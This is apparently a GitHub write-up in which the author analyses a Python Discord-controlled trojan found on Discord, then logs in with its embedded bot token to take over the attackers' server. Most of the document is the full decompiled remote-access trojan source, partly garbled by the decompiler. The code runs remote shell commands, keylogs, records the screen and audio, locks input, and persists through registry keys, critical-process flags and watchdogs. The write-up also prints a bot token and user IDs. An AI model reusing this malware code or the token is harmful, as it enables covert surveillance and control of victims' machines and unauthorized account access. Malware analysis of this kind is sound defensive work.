# Discord-Trojan-C2-Takedown-Writeup
Found a .exe attachment in a discord I was in so I decided to investigate!

### Initial Discovery
A user named ```uniplayzbutbetter_21087 (1246094570333274203)``` spammed the following:
![dreamcore](https://i.imgur.com/TZGIUge.png)

Which led to my first response, simply upload it to Virus Total.

![VT](https://i.imgur.com/EC5y7Kv.png)

This got me excited because it was Python based, which means it will be very easy to decompile!

![VT2](https://i.imgur.com/W909lpL.png)

Strangely DiE and others didn't divulge that it was PyInstaller, so I quickly checked in a hex editor.

![PyI](https://i.imgur.com/pR58wFD.png)

Turns out it definitely was, the file size likely played a part in it not being discovered as such. This is because the Pyinstaller header/magic, ```MEI```, is located at the bottom of the binary.

![MEI](https://i.imgur.com/xJDYQCR.png)

### Decompiling

![Decompile](https://i.imgur.com/5vhscyI.png)

After extracting the relevant PYC files I was able to get the ```dreamcore.pyc``` file. The rest was just imports and other nonsense, it wasn't using any modules from what I could see at the time and thus appeared to be based off a single .py file.

This Python malware once extracted from its .exe was 195mb which was interesting. But the main app itself was small enough.

![PYC](https://i.imgur.com/64SpOG2.png)

### Reading Code

I then decompiled this PYC and looked quickly at the imports to confirm my suspicions that there were no other modules hidden away. Turns out Python malware can get really bloated with such a small amount of imports.

```
import os
import sys
import time
import requests
import subprocess
import ctypes
import threading
import tkinter as tk
import asyncio
import discord
from discord.ext import commands
import winreg
from ctypes import wintypes
import psutil
```

So, whats the first thing I looked for when I saw they imported Discord?

```
BOT_TOKEN = 'MTQ3MjkxNjE1OTI2NjQyNzAyNA.Gwr59J.1ZhjXyiuVqlsAIYBmlBDwEnoQpz6c3nuXxdNps'
GUILD_ID = 1472918757247811678
```

Haha!

But now what does the actual malware do?

It connects to Discord as a bot and creates a per-victim category based on their computer name. Then via discord commands prefixed with ! they're able to communicate with it.

#### Features

- Run shell commands
- Screenshot capture (pyautogui)
- Audio recording (sounddevice + spicy)
- Screen recording (opencv + pyautogui)
- Keylogger (pyinput)
- Full screen black overlay (tkinter)
- Mouse lock
- Keybord lock (pynput)

#### Persistence

- Single instance mutex
- Copies itself into ```%APPDATA%\Microsoft DRM\audiosrv.exe``` and adds a Run registry key ```HKCU\Software\Microsoft\Windows\CurrentVersion\Run under DRM Audio Service```.
- Marks itself as hidden/system file
- Uses icacls to prevent deletion
- Watchdog thread to restart the process if it ends and checks if it missing
- Marks itself as process critical ```RtlSetProcessIsCritical``` to killing it may cause a BSOD

#### Exfiltration

- Discord bot
- Uses machine name as the victim ID
- Gets the victims IP via API call to ```ip-api.com```

#### Self-destruct

- Command ```!selfdestruct``` which disables critical process glag, removes registry key, restores file permissions and runs a .bat to delete the executable after exiting.

### My response

Given I had their bot token I quickly crafted up an app to login as their bot and view their discord server! 

It's by no means pretty but it does the job.

![Bot](https://i.imgur.com/H21xi1a.png)

With this I was able to [invite myself](https://discord.gg/Q3hakHACUT) to the discord, send their self-destruct command and annoy them. But the main goal was to see their chats, find any victims and see who was responsible.

```
[2026-02-16 11:37:13] v.z7y:
[2026-02-16 11:37:17] uniplayzbutbetter_21087: hi
[2026-02-16 11:44:31] nonsuspiciousbot#5828:
```

Luckily, their trojan wasn't much of a success, with only one victim (ollzpc-olly3) and with no keystrokes recorded.

But at least _my_ mission was a success:

```
1. nonsuspiciousbot#5828 (1472916159266427024) [bot]
2. uniplayzbutbetter_21087 (1246094570333274203) [owner]
3. v.z7y (949675941066584165)
```

They took down the bot and the discord not long after all of this investigation. I call that a win!

![Winning](https://i.imgur.com/JUFBnAB.png)

Thanks for reading!

## Source Code

```python


    #Decompiled Skiddy Trojan by CevAPI
    #Published by: uniplayzbutbetter_21087 (1246094570333274203) and v.z7y (949675941066584165)
    #Found On: Discord
    #Date: 16 Feb 26
    #Date Taken Down/Pwned: 16 Feb 26
     
    global black_screen_window
    global process_watchdog_active
    global mouse_locked
    global keylog_listener
    global self_destruct_flag
    global keylog_active
    global keys_locked
    # ***<module>: Failure: Different control flow
    import os
    import sys
    import time
    import requests
    import subprocess
    import ctypes
    import threading
    import tkinter as tk
    import asyncio
    import discord
    from discord.ext import commands
    import winreg
    from ctypes import wintypes
    import psutil
    PERSIST_DIR_NAME = 'Microsoft DRM'
    PERSIST_EXE_NAME = 'audiosrv.exe'
    REG_KEY_NAME = 'DRM Audio Service'
    MUTEX_NAME = 'Global\\AudioServiceMutex_{C4E8F9A2-B1D3-4A7E-9C5D-8F3E2A1B6C9D}'
    BOT_TOKEN = 'MTQ3MjkxNjE1OTI2NjQyNzAyNA.Gwr59J.1ZhjXyiuVqlsAIYBmlBDwEnoQpz6c3nuXxdNps'
    GUILD_ID = 1472918757247811678
    COMMAND_PREFIX = '!'
    victim_id: discord.Intents.default = f'{os.getenv('COMPUTERNAME', 'UnknownPC') if os.getenv('COMPUTERNAME', 'UnknownPC') else '-'}'.lower()
    intents.messages = True
    intents.message_content = True
    bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
    channels = {}
    black_screen_window = None
    mouse_locked = False
    keys_locked = False
    keylog_active = False
    keylog_listener = None
    keylog_file = os.path.join(os.environ.get('TEMP', '/tmp'), 'klog.tmp')
    is_persisted = False
    self_destruct_flag = False
    process_watchdog_active = True
    if os.name == 'nt':
        persist_dir: os.path.join = os.path.join(os.getenv('APPDATA'), PERSIST_DIR_NAME)
        if getattr(sys, 'frozen', False) and sys.executable.lower() == persist_path.lower():
                is_persisted = True
    def create_mutex():
        """Creates a named mutex to ensure only one instance runs (prevents conflicts)."""
        try:
            kernel32 = ctypes.windll.kernel32
            mutex = kernel32.CreateMutexW(None, False, MUTEX_NAME)
            if kernel32.GetLastError() == 183:
                print('[INFO] Another instance is already running. Exiting.')
                sys.exit(0)
            return mutex
        except:
            return None
    def make_process_critical():
        """Sets process as critical - termination will cause BSOD."""
        try:
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
            print('[PROTECTION] Process is now CRITICAL (BSOD on termination)')
        except Exception as e:
            print(f'[PROTECTION] Failed to set critical: {e}')
            return False
        return True
    def disable_process_critical():
        """Removes critical process flag (called during self-destruct)."""
        try:
            ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
            print('[CLEANUP] Critical process flag removed')
        except Exception as e:
            print(f'[CLEANUP] Failed to remove critical flag: {e}')
            return False
        return True
    def protect_process_handle():
        """Protects the process from being terminated via handles."""
        try:
            kernel32 = ctypes.windll.kernel32
            current_process = kernel32.GetCurrentProcess()
            PROCESS_SET_INFORMATION = 512
            PROCESS_QUERY_INFORMATION = 1024
            print('[PROTECTION] Process handle protection enabled')
        except Exception as e:
            print(f'[PROTECTION] Handle protection failed: {e}')
            return False
        return True
    def create_process_watchdog():
        """Creates a watchdog that monitors the main process and restarts it if killed."""
        def watchdog_loop():
            # ***<module>.create_process_watchdog.watchdog_loop: Failure: Different control flow
            current_pid = os.getpid()
            if process_watchdog_active:
                pass
            while True:
                time.sleep(5)
                print('[WATCHDOG] Self-destruct detected, stopping watchdog') if self_destruct_flag else None
                try:
                    if not psutil.pid_exists(current_pid):
                        print('[WATCHDOG] Main process terminated unexpectedly! Restarting...')
                        subprocess.Popen(persist_path, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
                    else:
                        if not os.path.exists(persist_path):
                            print('[WATCHDOG] Executable deleted! Attempting recovery...')
                    try:
                        key = winreg.HKEY_CURRENT_USER
                        key_path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                        with winreg.OpenKey(key, key_path, 0, winreg.KEY_READ) as reg_key:
                            value, _ = winreg.QueryValueEx(reg_key, REG_KEY_NAME)
                            raise Exception('Registry modified') if value!= persist_path else None
                    except:
                        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                            winreg.SetValueEx(reg_key, REG_KEY_NAME, 0, winreg.REG_SZ, persist_path)
                except Exception as e:
                    print(f'[WATCHDOG] Error: {e}')
        if is_persisted:
            watchdog_thread = threading.Thread(target=watchdog_loop, daemon=True)
            watchdog_thread.start()
            print('[PROTECTION] Process watchdog started')
    def create_restart_guardian():
        """Creates a separate guardian process that will restart the main process if it dies."""
        def guardian_script():
            return f'\nimport time\nimport os\nimport subprocess\nimport psutil\n\ntarget_exe = r\"{persist_path}\"\nmain_pid = {os.getpid()}\n\nprint(\"[GUARDIAN] Monitoring process PID:\", main_pid)\n\nwhile True:\n    time.sleep(10)\n    \n    # Check if main process still exists\n    if not psutil.pid_exists(main_pid):\n        print(\"[GUARDIAN] Main process died! Restarting...\")\n        subprocess.Popen(target_exe, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)\n        break\n    \n    # Check if executable still exists\n    if not os.path.exists(target_exe):\n        print(\"[GUARDIAN] Executable deleted!\")\n        break\n'
        try:
            guardian_path = os.path.join(os.environ['TEMP'], 'svchost_guardian.py')
            with open(guardian_path, 'w') as f:
                f.write(guardian_script())
            subprocess.Popen([sys.executable, guardian_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW, close_fds=True)
            print('[PROTECTION] Guardian process spawned')
        except Exception as e:
            print(f'[PROTECTION] Failed to create guardian: {e}')
    def hide_from_task_manager():
        # irreducible cflow, using cdg fallback
        """Makes the process invisible/unkillable in Task Manager."""
        # ***<module>.hide_from_task_manager: Failure: Compilation Error
        pass
        try:
            print('[STEALTH] Hidden from debuggers')
        except:
            pass
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)
            current_process = kernel32.GetCurrentProcess()
            token = wintypes.HANDLE()
            TOKEN_ADJUST_PRIVILEGES = 32
            TOKEN_QUERY = 8
            if advapi32.OpenProcessToken(current_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(token)):
                class LUID(ctypes.Structure):
                    _fields_ = [('LowPart', wintypes.DWORD), ('HighPart', wintypes.LONG)]
                class LUID_AND_ATTRIBUTES(ctypes.Structure):
                    _fields_ = [('Luid', LUID), ('Attributes', wintypes.DWORD)]
                class TOKEN_PRIVILEGES(ctypes.Structure):
                    _fields_ = [('PrivilegeCount', wintypes.DWORD), ('Privileges', LUID_AND_ATTRIBUTES * 1)]
                luid = LUID()
                if advapi32.LookupPrivilegeValueW(None, 'SeDebugPrivilege', ctypes.byref(luid)):
                    tp = TOKEN_PRIVILEGES()
                    tp.PrivilegeCount = 1
                    tp.Privileges[0].Luid = luid
                    tp.Privileges[0].Attributes = 2
                    advapi32.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None)
        except Exception as e:
            print(f'[STEALTH] Privilege elevation failed: {e}')
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        user32.ShowWindow(hwnd, 0) if hwnd else None
                    return None
    def enable_file_protection():
        """Makes the executable file protected and hidden."""
        try:
            subprocess.run(f'attrib +h +s \"{persist_path}\"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run(f'icacls \"{persist_path}\" /deny Everyone:(D)', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print('[PROTECTION] File is now protected and hidden')
        except Exception as e:
            print(f'[PROTECTION] File protection failed: {e}')
    def create_process_resurrection_service():
        """Creates multiple monitoring threads that will resurrect the process."""
        # ***<module>.create_process_resurrection_service: Failure: Compilation Error
        def resurrection_monitor():
            # ***<module>.create_process_resurrection_service.resurrection_monitor: Failure: Different control flow
            my_pid = os.getpid()
            if process_watchdog_active and (not self_destruct_flag):
                while True:
                    time.sleep(15)
                    try:
                        our_processes = [p for p in psutil.process_iter(['name', 'exe']) if p.info['exe'] and persist_path.lower() in p.info['exe'].lower()]
                        if len(our_processes) < 1 and (not self_destruct_flag):
                                print('[RESURRECTION] No instances found! Restarting...')
                                subprocess.Popen(persist_path, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
                    except Exception as e:
                        print(f'[RESURRECTION] Monitor error: {e}')
        for i in range(3):
                thread = threading.Thread(target=resurrection_monitor, daemon=True)
                thread.start()
            print('[PROTECTION] Resurrection service started (3 monitors)')
    def setup_persistence():
        """Handles copying the executable, setting registry keys, and protecting the file."""
        # ***<module>.setup_persistence: Failure: Different control flow
        if not os.name == 'nt' or not getattr(sys, 'frozen', False) or is_persisted:
            return None
        else:
            try:
                os.makedirs(persist_dir) if not os.path.exists(persist_dir) else None
                current_path = sys.executable
                subprocess.run(['copy', current_path, persist_path], shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                key = winreg.HKEY_CURRENT_USER
                key_path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, REG_KEY_NAME, 0, winreg.REG_SZ, persist_path)
                subprocess.Popen(persist_path, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
            except Exception as e:
                print(f'Persistence setup failed: {e}')
    def activate_all_protections():
        """Activates ALL protection mechanisms to make the process unkillable."""
        # ***<module>.activate_all_protections: Failure: Different bytecode
        if not is_persisted:
            return
        else:
            print('ACTIVATING UNKILLABLE PROTECTION MECHANISMS')
            print('==================================================')
            make_process_critical()
            hide_from_task_manager()
            protect_process_handle()
            enable_file_protection()
            create_process_watchdog()
            create_restart_guardian()
            create_process_resurrection_service()
            print('==================================================')
            print('ALL PROTECTION LAYERS ACTIVATED')
            print('ONLY !selfdestruct CAN TERMINATE THIS PROCESS')
            print('==================================================\n')
    @bot.event
    async def on_ready():
        """Called when the bot connects and is ready."""
        print(f'[INFO] Logged in as {bot.user}')
        if is_persisted:
            activate_all_protections()
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            print(f'[FATAL] Cannot find server with ID: {GUILD_ID}.')
            await bot.close()
        else:
            category_name = ''.join((c for c in victim_id if c.isalnum() or c in '-_')).strip()
            category = discord.utils.get(guild.categories, name=category_name)
            if not category:
                try:
                    category = await guild.create_category(category_name)
                except discord.Forbidden:
                    print('[FATAL] Bot lacks \'Manage Channels\' permission.')
                    await bot.close()
                    return
            channel_names = {'commands': '🕹️-commands', 'general': '📄-general-output', 'screenshots': '🖼️-screenshots', 'keylogs': '⌨️-keylogs', 'files': '📦-files'}
            for key, name in channel_names.items():
                channel = discord.utils.get(guild.text_channels, name=name, category=category)
                if not channel:
                    try:
                        channel = await guild.create_text_channel(name, category=category)
                    except discord.Forbidden:
                        print('[FATAL] Bot lacks \'Manage Channels\' permission.')
                        await bot.close()
                        return
                channels[key] = channel
            print('[INFO] All channels are ready.')
            await send_connection_message()
    @bot.event
    async def on_message(message):
        """Listens for new messages and processes commands."""
        # ***<module>.on_message: Failure: Different control flow
        if message.author == bot.user or not message.content.startswith(COMMAND_PREFIX) or message.channel.id!= channels.get('commands', 0).id:
            return
        else:
            full_cmd = message.content[len(COMMAND_PREFIX):].strip()
            parts = full_cmd.split(maxsplit=1)
            cmd, args = (parts[1] if len(parts) > 1 else '', cmd)
            print(f'\n[COMMAND RECEIVED] {full_cmd}')
            if cmd == 'screenshot':
                await asyncio.to_thread(take_screenshot)
            else:
                if cmd == 'record_audio':
                    try:
                        await post_results(f'🎙️ Recording {int(args)}s...', 'general')
                    except:
                        await post_results('❌ Usage: `!record_audio <seconds>`', 'general')
                    else:
                        pass
                else:
                    if cmd == 'record_screen':
                        pass
                        try:
                            pass
                        except:
                            await post_results('❌ Usage: `!record_screen <seconds>`', 'general')
                        else:
                            pass
                    else:
                        if cmd == 'echo':
                            if args:
                                await asyncio.to_thread(show_message, args)
                            else:
                                await post_results('❌ Usage: `!echo <message>`', 'general')
                        else:
                            if cmd == 'screen_black':
                                await asyncio.to_thread(start_black_screen)
                            else:
                                if cmd == 'screen_normal':
                                    await asyncio.to_thread(stop_black_screen)
                                else:
                                    if cmd == 'mouselock':
                                        await asyncio.to_thread(start_mouse_lock)
                                    else:
                                        if cmd == 'mouseunlock':
                                            await asyncio.to_thread(stop_mouse_lock)
                                        else:
                                            if cmd == 'keylock':
                                                await asyncio.to_thread(start_key_lock)
                                            else:
                                                if cmd == 'keyunlock':
                                                    await asyncio.to_thread(stop_key_lock)
                                                else:
                                                    if cmd == 'keylog_start':
                                                        await asyncio.to_thread(start_keylogger)
                                                    else:
                                                        if cmd == 'keylog_stop':
                                                            await asyncio.to_thread(stop_keylogger)
                                                        else:
                                                            if cmd == 'keylog_dump':
                                                                await asyncio.to_thread(dump_keylog)
                                                            else:
                                                                if cmd == 'cd':
                                                                    try:
                                                                        os.chdir(args)
                                                                        await post_results(f'✅ CD: `{os.getcwd()}`', 'general')
                                                                    except Exception as e:
                                                                        await post_results(f'❌ cd failed: {e}', 'general')
                                                                    else:
                                                                        pass
                                                                else:
                                                                    if cmd == 'selfdestruct':
                                                                        await post_results('⚠️ Self-destruct initiated. Cleaning up...', 'general')
                                                                        self_destruct()
                                                                    else:
                                                                        if cmd == 'help':
                                                                            await post_results('**Commands:** `!screenshot` | `!record_audio <sec>` | `!record_screen <sec>` | `!echo <text>` | `!screen_black/normal` | `!mouselock/unlock` | `!keylock/unlock` | `!keylog_start/stop/dump` | `!cd <path>` | `!selfdestruct` | `!help` | *Any other shell command*', 'general')
                                                                        else:
                                                                            try:
                                                                                result = await asyncio.to_thread(subprocess.run, full_cmd, shell=True, capture_output=True, text=True, errors='ignore', timeout=60)
                                                                                await post_results(result.stdout + result.stderr or '[No output]', 'general')
                                                                            except subprocess.TimeoutExpired:
                                                                                await post_results('❌ Command timed out.', 'general')
                                                                            except Exception as e:
                                                                                await post_results(f'❌ Command failed: {e}', 'general')
            await message.remove_reaction('⏳', bot.user)
            await message.add_reaction('✅')
    async def post_results(output, channel_key, is_file_path=False):
        # irreducible cflow, using cdg fallback
        # ***<module>.post_results: Failure: Compilation Error
        if channel_key not in channels:
            print(f'[ERROR] Invalid channel key: {channel_key}')
            return None
        else:
            channel = channels[channel_key]
            if is_file_path:
                if not os.path.exists(output):
                    await post_results(f'❌ File not found: `{output}`', 'general')
                    await post_results(f'📤 Uploading `{os.path.basename(output)}`...', 'general')
                    await channel.send(file=discord.File(output))
                    os.remove(output)
                if not output.strip():
                    output = '[No output]'
                for i in range(0, len(output), 1990):
                    await channel.send(f'```\n{output[i:i + 1990]}\n```')
                    except Exception as e:
                            print(f'[ERROR] Post results failed: {e}')
                            await channels['general'].send(f'❌ Post results failed: {e}')
    def get_ip_geolocation():
        # ***<module>.get_ip_geolocation: Failure: Different control flow
        return requests.get('http://ip-api.com/json/', timeout=5)
        try:
            pass
        except Exception as e:
            return f'❌ IP geolocation failed: {e}'
    async def send_connection_message():
        location_data = await asyncio.to_thread(get_ip_geolocation)
        protection_status = '🔒 UNKILLABLE' if is_persisted else '⚠️ NOT PROTECTED'
        await post_results(f'🟢 **NEW VICTIM** | {protection_status}\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 **ID:** `{victim_id}`\n🖥️ **OS:** `{sys.platform}`\n🛡️ **Protected:** `{is_persisted}`\n{location_data}', 'general')
    def take_screenshot():
        # ***<module>.take_screenshot: Failure: Compilation Error
        try:
            import pyautogui, os.path.join(os.environ.get('TEMP', '/tmp'), 'ss.png')
            pyautogui.screenshot(ss_path)
            asyncio.run_coroutine_threadsafe(post_results(ss_path, 'screenshots', is_file_path=True), bot.loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(post_results(f'❌ Screenshot failed: {e}', 'general'), bot.loop)
    def record_audio(duration):
        # ***<module>.record_audio: Failure: Different bytecode
        try:
            import sounddevice as sd
            from scipy.io.wavfile import write
            fs = 44100
            path, rec = (sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16'), sd.wait())
            write(path, fs, rec)
            asyncio.run_coroutine_threadsafe(post_results(path, 'files', is_file_path=True), bot.loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(post_results(f'❌ Audio recording failed: {e}', 'general'), bot.loop)
    def record_screen(duration):
        # ***<module>.record_screen: Failure: Different control flow
        try:
            import cv2, numpy as np, pyautogui
            screen_size = pyautogui.size()
            video_path, fourcc = (cv2.VideoWriter_fourcc(*'XVID'), os.path.join(os.environ.get('TEMP', '/tmp'), 'screen_rec.avi'))
            out = cv2.VideoWriter(video_path, fourcc, 20.0, screen_size)
            start_time = time.time()
            if time.time() - start_time < duration:
                out.write(cv2.cvtColor(np.array(pyautogui.screenshot()), cv2.COLOR_RGB2BGR))
            out.release()
            asyncio.run_coroutine_threadsafe(post_results(video_path, 'files', is_file_path=True), bot.loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(post_results(f'❌ Screen recording failed: {e}', 'general'), bot.loop)
    def show_message(text):
        try:
            if os.name == 'nt':
                ctypes.windll.user32.MessageBoxW(0, text, 'System Warning', 48)
            else:
                if sys.platform == 'darwin':
                    subprocess.run(['osascript', '-e', f'display dialog \"{text}\" with title \"System Warning\" with icon caution'])
                else:
                    subprocess.run(['zenity', '--warning', '--text', text])
            asyncio.run_coroutine_threadsafe(post_results('✅ Message box displayed.', 'general'), bot.loop)
        except Exception as e:
            asyncio.run_coroutine_threadsafe(post_results(f'❌ Message box failed: {e}', 'general'), bot.loop)
    def on_press(key):
        # irreducible cflow, using cdg fallback
        # ***<module>.on_press: Failure: Compilation Error
        if not keylog_active:
            return False
        else:
            with open(keylog_file, 'a') as f:
                pass
            f.write(key.char)
                except AttributeError:
                    if key == key.space:
                        f.write(' ')
                        if key == key.enter:
                            f.write('[ENTER]\n')
                            f.write(f'[{str(key).split('.')[(-1)]}]')
    def start_keylogger():
        global keylog_active
        global keylog_listener
        # ***<module>.start_keylogger: Failure: Compilation Error
        asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keylogger already running.', 'general'), bot.loop) if keylog_active else asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keylogger already running.', 'general'), bot.loop)
            try:
                from pynput.keyboard import Listener
                keylog_active = True
                keylog_listener = Listener(on_press=on_press)
                keylog_listener.start()
                asyncio.run_coroutine_threadsafe(post_results('✅ Keylogger started.', 'general'), bot.loop)
            except Exception as e:
                asyncio.run_coroutine_threadsafe(post_results(f'❌ Keylogger failed: {e}', 'general'), bot.loop)
    def stop_keylogger():
        global keylog_active
        global keylog_listener
        if not keylog_active:
            asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keylogger not running.', 'general'), bot.loop)
        else:
            keylog_active = False
            if keylog_listener:
                keylog_listener.stop()
                keylog_listener = None
            asyncio.run_coroutine_threadsafe(post_results('✅ Keylogger stopped.', 'general'), bot.loop)
    def dump_keylog():
        if os.path.exists(keylog_file) and os.path.getsize(keylog_file) > 0:
            asyncio.run_coroutine_threadsafe(post_results(keylog_file, 'keylogs', is_file_path=True), bot.loop)
            open(keylog_file, 'w').close()
        else:
            asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keylog is empty.', 'general'), bot.loop)
    def create_black_screen():
        global black_screen_window
        try:
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.configure(bg='black')
            root.protocol('WM_DELETE_WINDOW', lambda: None)
            black_screen_window = root
            root.mainloop()
        except Exception as e:
            asyncio.run_coroutine_threadsafe(post_results(f'❌ Black screen failed: {e}', 'general'), bot.loop)
    def start_black_screen():
        # ***<module>.start_black_screen: Failure: Different bytecode
        if black_screen_window:
            asyncio.run_coroutine_threadsafe(post_results('ℹ️ Black screen already active.', 'general'), bot.loop)
        else:
            asyncio.run_coroutine_threadsafe(post_results('✅ Black screen activated.', 'general'), bot.loop)
    def stop_black_screen():
        global black_screen_window
        # ***<module>.stop_black_screen: Failure: Compilation Error
        asyncio.run_coroutine_threadsafe(post_results('ℹ️ Black screen not active.', 'general'), bot.loop) or black_screen_window
            try:
                black_screen_window.destroy()
                black_screen_window = None
            except Exception as e:
                asyncio.run_coroutine_threadsafe(post_results(f'❌ Failed to remove black screen: {e}', 'general'), bot.loop)
    def mouse_lock_thread():
        # irreducible cflow, using cdg fallback
        # ***<module>.mouse_lock_thread: Failure: Compilation Error
        import pyautogui
        w, h = pyautogui.size()
        if mouse_locked:
            pyautogui.moveTo(w // 2, h // 2, duration=0)
                return None
    def start_mouse_lock():
        global mouse_locked
        if mouse_locked:
            asyncio.run_coroutine_threadsafe(post_results('ℹ️ Mouse already locked.', 'general'), bot.loop)
        else:
            mouse_locked = True
            threading.Thread(target=mouse_lock_thread, daemon=True).start()
            asyncio.run_coroutine_threadsafe(post_results('✅ Mouse locked.', 'general'), bot.loop)
    def stop_mouse_lock():
        global mouse_locked
        # ***<module>.stop_mouse_lock: Failure: Different bytecode
        if not mouse_locked:
            asyncio.run_coroutine_threadsafe(post_results('ℹ️ Mouse not locked.', 'general'), bot.loop)
        else:
            mouse_locked = False
    def start_key_lock():
        global keys_locked
        global keylog_listener
        # ***<module>.start_key_lock: Failure: Compilation Error
        from pynput.keyboard import Listener
        asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keyboard already locked.', 'general'), bot.loop) if keys_locked else asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keyboard already locked.', 'general'), bot.loop)
            try:
                keys_locked = True
                keylog_listener = Listener(on_press=lambda key: not keys_locked, suppress=True)
                keylog_listener.start()
                asyncio.run_coroutine_threadsafe(post_results('✅ Keyboard locked.', 'general'), bot.loop)
            except Exception as e:
                asyncio.run_coroutine_threadsafe(post_results(f'❌ Keyboard lock failed: {e}', 'general'), bot.loop)
    def stop_key_lock():
        global keys_locked
        global keylog_listener
        if not keys_locked:
            asyncio.run_coroutine_threadsafe(post_results('ℹ️ Keyboard not locked.', 'general'), bot.loop)
        else:
            keys_locked = False
            if keylog_listener:
                keylog_listener.stop()
                keylog_listener = None
            asyncio.run_coroutine_threadsafe(post_results('✅ Keyboard unlocked.', 'general'), bot.loop)
    def self_destruct():
        """SAFELY removes all protections and deletes the malware. ONLY way to terminate."""
        global self_destruct_flag
        global process_watchdog_active
        # ***<module>.self_destruct: Failure: Different bytecode
        print('\n==================================================')
        print('==================================================')
        self_destruct_flag = True
        process_watchdog_active = False
        time.sleep(2)
        if os.name == 'nt' and is_persisted:
                print('[CLEANUP] Removing critical process protection...')
                disable_process_critical()
                time.sleep(1)
                try:
                    key = winreg.HKEY_CURRENT_USER
                    key_path = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                        winreg.DeleteValue(reg_key, REG_KEY_NAME)
                    print('[CLEANUP] Registry key removed')
                except Exception as e:
                    print(f'[CLEANUP] Failed to remove registry: {e}')
                try:
                    subprocess.run(f'attrib -h -s \"{persist_path}\"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    subprocess.run(f'icacls \"{persist_path}\" /grant Everyone:(F)', shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
                    print('[CLEANUP] File permissions restored')
                except Exception as e:
                    print(f'[CLEANUP] Failed to unlock file: {e}')
        try:
            script_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            deleter_path = os.path.join(os.environ['TEMP'], 'cleanup_final.bat')
            with open(deleter_path, 'w') as f:
                f.write('@echo off\n')
                f.write('echo Waiting for process to terminate...\n')
                f.write('timeout /t 5 /nobreak > NUL\n')
                f.write('echo Deleting malware...\n')
                f.write(f'del /f /q \"{script_path}\"\n')
                f.write('echo Cleanup complete.\n')
                f.write('timeout /t 2 /nobreak > NUL\n')
                f.write('del \"%~f0\"\n')
            subprocess.Popen(f'\"{deleter_path}\"', shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
            print('[CLEANUP] Deletion script created and launched')
        except Exception as e:
            print(f'[CLEANUP] Failed to create deletion script: {e}')
        print('==================================================')
        print('SELF-DESTRUCT COMPLETE - EXITING')
        print('==================================================\n')
        sys.exit(0)
    if __name__ == '__main__':
        mutex = create_mutex()
        setup_persistence()
        try:
            bot.run(BOT_TOKEN)
        except discord.errors.LoginFailure:
            print('[FATAL] Invalid BOT_TOKEN. Token may be expired or revoked.')
        except Exception as e:
            print(f'[FATAL] An error occurred: {e}')

```
